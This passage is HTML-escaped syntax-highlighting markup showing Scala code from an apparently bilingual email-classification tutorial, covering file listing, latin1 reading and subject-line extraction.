&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-28&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sortBy&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;emailDate&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-29&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainingData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testingData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;timeSortedMails&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-31&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;splitAt&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;timeSortedMails&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-32&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-34&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-35&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getFilesFromDir&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-36&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-37&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;isDirectory&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-38&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Remove the mac os basic storage file, &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-39&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//and alternatively for unix systems &quot;cmds&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-40&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//移除mac os的基本存储文件或者unix系统的“cmds”文件&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-41&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;listFiles&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;isFile&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-42&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;.DS_Store&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-43&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;cmds&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toList&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-44&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-45&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-46&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-47&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-48&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-49&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getFullEmail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-50&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Note that the encoding of the example files is latin1, &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-51&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//thus this should be passed to the from file method.&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-52&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//注意案例文件采用latin1编码，因此应该把它们传递给fronFile方法&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-53&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scala&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;fromFile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;latin1&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-54&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;fullEmail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getLines &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mkString&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;n&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-55&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-56&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-57&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;fullEmail&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-58&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-59&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-60&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getSubjectFromEmail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-61&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-62&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Find the index of the end of the subject line&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-63&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//找出主题行的结束标志&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-64&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;subjectIndex&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Subject:&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-65&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;endOfSubjectIndex&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-66&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;subjectIndex&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;                        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;n&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;subjectIndex&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-67&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-68&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Extract the subject: start of subject + 7 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-69&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// (length of Subject:) until the end of the line.&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-70&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//抽取主题：主题开端+7（主题的长度），直到该行结束&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-71&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;subject&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;email&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-72&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;subjectIndex&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;endOfSubjectIndex&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-73&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;trim&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-74&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toLowerCase&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-75&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-76&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Additionally, we check whether the email was a response and &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-77&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//remove the &#39;re: &#39; tag, to make grouping on topic easier:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-78&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//此外，我们检查邮件是否是一封回复并删除“re：”标签，使对话题的分组更容易&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-79&quot;&gt;
